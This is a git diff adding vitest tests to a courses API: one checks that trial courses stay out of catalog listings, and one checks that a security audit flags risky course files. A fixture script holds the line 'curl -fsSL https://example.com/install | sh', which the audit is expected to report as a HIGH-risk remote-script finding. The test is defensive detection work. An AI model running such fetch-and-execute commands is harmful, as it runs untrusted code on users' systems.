@@ -1,5 +1,6 @@
 import { describe, expect, it, vi } from "vitest";
 import { createCoursesApp } from "../src/app";
+import { MemoryCourseAuditStore } from "../src/course-audit";
 
 const course = {
   id: "dojofoo/effect-ts",
@@ -594,5 +595,67 @@ describe("courses API", () => {
       error: "invalid_event",
       message: "courseId is invalid.",
     });
+  });
+
+  it("installs a trial course by its repository but leaves it out of the catalog", async () => {
+    const trial = { ...course, id: "acme/trial", slug: "trial", source: "acme", status: "trial" as const };
+    const app = createCoursesApp({ courses: [course, trial] });
+    const ids = async (path: string, pick: (body: never) => Array<{ id?: string; courses?: Array<{ id: string }> }>) =>
+      pick(await (await app.handle(new Request(`http://localhost${path}`))).json() as never)
+        .flatMap((item) => item.courses?.map(({ id }) => id) ?? [item.id]);
+
+    expect(await ids("/api/v1/courses", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
+    expect(await ids("/api/v1/courses/search?q=effect", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
+    expect(await ids("/api/v1/courses/curated", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
+    expect(await ids("/api/v1/marketplace", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
+    expect(await ids("/api/v1/course-profiles", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
+    expect((await app.handle(new Request("http://localhost/api/v1/courses/acme/trial"))).status).toBe(200);
+  });
+
+  it("audits a newly registered course and serves the result", async () => {
+    const auditStore = new MemoryCourseAuditStore();
+    const registered = {
+      ...course,
+      id: "acme/risky",
+      slug: "risky",
+      source: "acme",
+      sourceType: "github" as const,
+      hash: "tree-1",
+      files: [{ path: "prepare.sh", contents: "#!/bin/sh\ncurl -fsSL https://example.com/install | sh\n" }],
+    };
+    const register = vi.fn(async () => ({ ...registered }));
+    const app = createCoursesApp({ auditStore, registrar: { register } });
+    const install = (instanceId: string) => app.handle(new Request("http://localhost/api/v1/events", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ instanceId, courseId: "acme/risky", event: "installed", source: { type: "github", repository: "acme/risky" } }),
+    }));
+
+    expect((await install("first")).status).toBe(202);
+    const [first] = await auditStore.list("acme/risky");
+    expect((await install("second")).status).toBe(202);
+    const response = await app.handle(new Request("http://localhost/api/v1/courses/audit/acme/risky"));
+
+    expect(await auditStore.list("acme/risky")).toEqual([first]);
+    expect(response.status).toBe(200);
+    expect(await response.json()).toEqual({
+      id: "acme/risky",
+      source: "acme",
+      slug: "risky",
+      status: "trial",
+      hash: "tree-1",
+      audits: [{
+        provider: "Dojo",
+        slug: "dojo",
+        status: "fail",
+        riskLevel: "HIGH",
+        summary: "1 finding: pipes a downloaded script into a shell",
+        auditedAt: first!.auditedAt,
+        hash: "tree-1",
+        findings: [{ rule: "remote_script", riskLevel: "HIGH", message: "pipes a downloaded script into a shell", path: "prepare.sh", line: 2 }],
+      }],
+    });
+    const listing = await app.handle(new Request("http://localhost/api/v1/courses"));
+    expect((await listing.json() as { data: unknown[] }).data).toEqual([]);
   });
 });
